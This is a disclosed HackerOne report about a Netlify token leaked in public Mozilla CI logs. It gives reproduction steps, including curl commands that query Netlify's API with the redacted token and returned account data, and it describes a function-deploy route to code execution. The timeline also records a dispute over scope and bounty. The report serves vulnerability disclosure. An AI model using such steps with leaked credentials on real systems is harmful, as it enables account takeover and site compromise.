---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-disclosure
  - env/web
  - vuln/dos
  - vuln/secrets-leak
  - trigger/social-engineering
  - fix/secrets-rotation
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2025-05-13
submitted: 2024-12-27T21:52:44.033Z
bounty_usd: null
votes: 123
cve: []
program: "[[programs/mozilla|Mozilla]]"
reporter: "samirsec0x01"
source: "https://hackerone.com/reports/2915647"
title: "Netlify Authentication Token Exposed in Public Mozilla CI Logs"
---
# Netlify Authentication Token Exposed in Public Mozilla CI Logs

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 123 | **Program:** Mozilla | **Disclosed:** 2025-05-13

- Report: [https://hackerone.com/reports/2915647](https://hackerone.com/reports/2915647)
- CWE: Information Disclosure
- Submitted: 2024-12-27T21:52:44.033Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

A critical vulnerability was discovered involving the exposure of a Netlify authentication token within publicly accessible logs. This token provided full access to the `Mozilla IT Web SRE` Netlify account, bypassing all restrictions. The token’s permissions encompassed roles such as Owner, Developer, Billing Admin, Reviewer, Publisher, and Content Editor, granting complete control over site management, deployments, billing, and content configurations. This exposed API key posed significant security risks, enabling unauthorized users to manipulate the account and its associated assets freely.

---

### **Key Information:**
- **Exposed Token:** `███`
- **Source of Exposure:**
  - **Public URL:** [Mozilla CI Logs](https://firefox-ci-tc.services.mozilla.com/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log)
  - **File:** `live.log`
- **API Used for Verification:** [Netlify API Documentation](https://open-api.netlify.com/)
- **Website at Risk:** `https://crash-pings.mozilla.org`
- **Account at Risk:** `Mozilla IT Web SRE`

---

### **Steps to Reproduce:**

1. **Access Public Log:**
   - Open the following URL in a browser: [Mozilla CI Logs](https://firefox-ci-tc.services.mozilla.com/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log).

2. **Locate the Exposed Token:**
   - Search for the keyword `auth:` in the log file.
   - Extract the Netlify token (e.g., `███`).

3. **Verify Token Validity:**
   - Use the token to query the Netlify API. For example:

```bash
curl -X GET https://api.netlify.com/api/v1/accounts -H "Authorization: Bearer ████" -s | jq
```

   - Observe the response containing sensitive information about the Netlify account's sites.

```json
[
  {
    "name": "Mozilla IT Web SRE",
    "slug": "mozilla-it",
    "role": "Developer",
    ...
    ...
    "selected_access_site_ids": [
      "5a05c659-aa54-4184-bdbe-7faa4dd497b5"
    ],
    "billing_name": "it-sre",
    "billing_email": "it-sre@mozilla.com",
    "billing_details": null,
    ...
    ...
    "roles_allowed": [
      "Owner",
      "Developer",
      "Billing Admin",
      "Reviewer",
      "Publisher",
      "Content Editor"
    ],
    "created_at": "2019-06-26T13:57:19.242Z",
    "updated_at": "2024-07-08T18:56:21.541Z",
    "has_site_password": false,
    "site_sso_login": false,
    "site_sso_login_context": "all",
    "site_jwt_secret": null,
    "saml_config": {
      "idp_entity_id": "urn:auth.mozilla.auth0.com",
      "idp_sso_target_url": "https://auth.mozilla.auth0.com/samlp/hj3jYIhcrgvPWTpnFoHWLPx57t6KKqhA",
      "idp_slo_target_url": "https://auth.mozilla.auth0.com/samlp/hj3jYIhcrgvPWTpnFoHWLPx57t6KKqhA/logout",
      "idp_cert_fingerprint": "2F:C4:72:FC:FE:1C:69:A6:6E:8B:A7:FA:72:AA:3D:08:B0:A0:6A:F8"
    },
    "saml_session_expiration": 604800,
    "deploy_notifications_per_repo": true,
    "payments_gateway_name": "zuora_production",
    "lifecycle_state": "active",
    "lifecycle_state_reason": null,
    "weeks_past_due": null,
    "days_until_disabled": null,
    "current_billing_period_start": "2024-12-26T00:00:00.000-08:00",
    "next_billing_period_start": "2025-01-26T00:00:00.000-08:00",
    "current_usage_period_start": "2024-12-01T00:00:00.000-08:00",
    "next_usage_period_start": "2025-01-01T00:00:00.000-08:00",
    ...
    ...
    "type_name": "Enterprise",
    "type_id": "58f792a3d6865d698b6879bd",
    "type_slug": "enterprise",
    "monthly_seats_addon_dollar_price": "0.0",
    "owner_ids": [
      "60be48126deb9594c56ad4a0",
      "60c285a4fa8ef00f41b7a171",
      "60eda0538f4cf6540569b4b5",
      "62548540b51a811561330ed7",
      "62c5e063fe09d502f8dc2519",
      "62f22a000c27a1187e2be65b",
      "62ffe60780a012285fb7d36f",
      "63b429858592e6679549e622",
      "650deaef51dc692b41f8b3f2",
      "658210e2646ba26e2d050ff4"
    ],
    "saml_enabled": true,
    "org_saml_enabled": false,
    "org_mfa_enabled": false,
    "default": false,
    "cancellable": false,
    "has_builds": true,
    "enforce_saml": "enforced_strict",
    "team_logo_url": null,
    "can_start_pro_trial": false,
    "on_pro_trial": false,
    "can_start_enterprise_trial": false,
    "on_enterprise_trial": false,
    "security_contacts": [],
    "gitlab_self_hosted_config": null,
    "github_enterprise_config": null,
    "bitbucket_self_hosted_config": null
  }
]
```

4. **Confirm Full Access:**
   - Perform other API requests, such as deploying, deleting, or modifying sites.
   - For example, access sensitive logs, environment variables, or site configurations.
   - You can test all endpoints in Netlify api docs: https://open-api.netlify.com

---

## **Proof of Concept (PoC):**
I have created a POC video:
███

---

### **Recommendations:**

1. **Revoke the Token:**
   - Revoke the exposed token immediately and notify all affected stakeholders.

2. **Audit Logging Practices:**
   - Review all CI/CD pipelines to ensure sensitive data (e.g., authentication tokens) are masked.

3. **Enhance Token Security:**
   - Implement OAuth scopes or IP whitelisting to restrict token usage.
   - Monitor for suspicious API usage to detect possible exploitation.

---

## **Thank You!**
I appreciate the opportunity to report this critical issue and assist in securing your systems.

---

## Impact

The leaked authentication token provides **full access** to the Netlify account, leading to the following risks:

	1.	**Financial Theft:**
	-	Change the `billing_email` to divert all payouts to an attacker-controlled account.
	2.	**Site Compromise:**
	-	Modify, delete, or deploy malicious content on the associated site (https://crash-pings.mozilla.org).
	3.	**Data Exposure:**
	-	Access environment variables, logs, and other sensitive configuration data.
	4.	**Reputation Damage:**
	-	Use the compromised account to host malicious content or phishing attacks.
	5.	**Permanent Loss of Control:**
	-	Delete all sites and configurations, causing irreversible damage.

## Timeline

- **Report Filed**
- **Report Vulnerability Information Updated**
- **2024-12-28** @samirsec0x01: After reporting the Netlify auth token leak, I explored the impact of this leak and discovered Remote Code Execution (RCE) vector using the “Deploy Functions” feature as documented [Here](https://docs.netlify.com/functions/deploy/).

When running the API command:
```bash
curl -X GET https://api.netlify.com/api/v1/sites/5a05c659-aa54-4184-bdbe-7faa4dd497b5/functions -H "Authorization: Bearer ████" -s | jq
```
I received the following JSON response, indicating the deployed functions and their configurations. This includes sensitive details like endpoint, id, and runtime.
```json
{
  "id": "d1b408860d22bd082803a42f6caf2ffc7801a3da",
  "provider": "aws_lambda",
  "created_at": "2024-12-28T11:07:00.432Z",
  "functions": [
    {
      "n": "ping-details",
      "d": "09cc96067161704a37c45acbb945b6b699ede64170ec6cf703d2774eda6b7beb",
      "dn": null,
      "g": null,
      "bd": null,
      "p": 10,
      "id": "51831141b68cc7e140ccc545350ef9c8221f968012c8a69f059c8f8d14cbb1c9",
      "a": "547055491697",
      "c": "2024-12-28T11:07:17.329Z",
      "m": 1024,
      "obl": "netlify-observability-extension",
      "oblv": 29,
      "oid": "803098cb958230b36e4f403febc240d5199b6c39cac28a3653ded42bea387442",
      "r": "nodejs18.x",
      "rg": "us-east-2",
      "s": 79482620,
      "endpoint": "https://crash-pings.mozilla.org/.netlify/functions/ping-details",
      "schedule": null
    }
  ],
  "log_type": "socketeer",
  "branch": null
}
```

As per [Netlify’s API documentation](https://open-api.netlify.com/#tag/function/operation/uploadDeployFunction), a user with the leaked token can deploy a new function containing arbitrary JavaScript or Go code with a `PUT` request to `https://api.netlify.com/api/v1/deploys/{deploy_id}/functions/{name}`. Since these functions are executed as AWS Lambda functions, they can include OS-level commands.

This combination of token leakage and unrestricted deployment of executable code can lead to RCE, putting affected Netlify projects and their environments at significant risk.
- **Report Pending Program Review**
- **Changed Scope**
- **Report Triaged**
- **2024-12-31** @samirsec0x01: Dear Mozilla Team and @frida-k 

I hope this message finds you well. First and foremost, I would like to thank you for recognizing the critical nature of the vulnerability I reported. It means a lot to me to contribute to your platform’s security and to see my efforts acknowledged in this way.

I understand that the bounty range for critical vulnerabilities is between $6,000 and $15,000, and I deeply respect your team’s policies and discretion in determining the reward amount. However, I wanted to kindly share that I am currently in need of a reliable car, which has been a significant personal goal for some time now. Achieving this goal would greatly improve my daily life and allow me to focus even more on my work and passion for security research.

If it’s within your ability, I would humbly ask for a reward amount closer to the upper end of the range, or even a bonus, as it would make a meaningful difference for me. I truly appreciate your understanding and consideration of my situation.

Thank you so much for your time, and I am incredibly grateful for the opportunity to contribute to your program. Regardless of the final decision, I remain excited to collaborate with your team and continue making the internet a safer place.

Thanks
- **2024-12-31** @frida-k: Hello @samirsec0x01, We discuss bounty decisions on a weekly basis, so we will update you when we had a chance to discuss this report in the next couple of weeks. To set your expectations, the asset you reported the issue in is out of scope of our program, the range you mentioned is for critical issues in critical assets, for critical issues in out of scope assets, we pay in the range of $500-$1000, as we mention in our policy:

{F3903198}

Thank you again for your report.

Thanks,
Frida
- **2024-12-31** @samirsec0x01: Hello @frida-k 

Thank you for the update and for reviewing my report. I wanted to clarify that the issue I discovered is specifically within the asset `firefox-ci-tc.services.mozilla.com`. Based on the context of your bug bounty program, I believe this asset plays a critical role in your ecosystem and should be treated accordingly.

The vulnerability I reported has significant potential impact, and I would appreciate it if you could reconsider its scope classification or clarify why this asset is considered out of scope.

I value Mozilla’s commitment to security and transparency and look forward to further updates or discussions regarding this matter.

Thank you for your time and consideration.
- **2024-12-31** @samirsec0x01: Hello @frida-k 

As you previously mentioned:

	>It looks like running the Netlify command echoed the token in cleartext in the logs, and we should implement masking or use less verbose logging.

The primary vulnerability lies in `firefox-ci-tc.services.mozilla.com`, where the token is echoed in cleartext in the logs. This issue allows unauthorized users to access sensitive authentication tokens. I exploited this vulnerability and successfully retrieved an auth token, demonstrating the validity of this issue. It poses a significant risk as it can lead to token leakage.

Furthermore, if such a token were discovered on an out-of-scope asset, such as GitHub, the issue would likely fall under out-of-scope findings. In such cases, the bounty should be within the range of $500 to $1,000.

As you mentioned in policy:
{F3903584}

I found a hardcoded credentials for a privileged user at `firefox-ci-tc.services.mozilla.com` and this is a critical asset,
- **Report Resolved**
- **2025-01-06** @frida-k: Hello @samirsec0x01, I understand that the token was leaked in taskcluster but the impact of the leak was actually on crash-pings.mozilla.org. Taskcluster is an ecosystem where we run our builds and tests similar to Github actions, the vulnerability is in how the task for the application was configured and not in taskcluster itself. This is similar to finding a vulnerable github action for a repo on github, in these cases, the problem is in the github action configuration and not github itself. Hope this explains our decision.
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
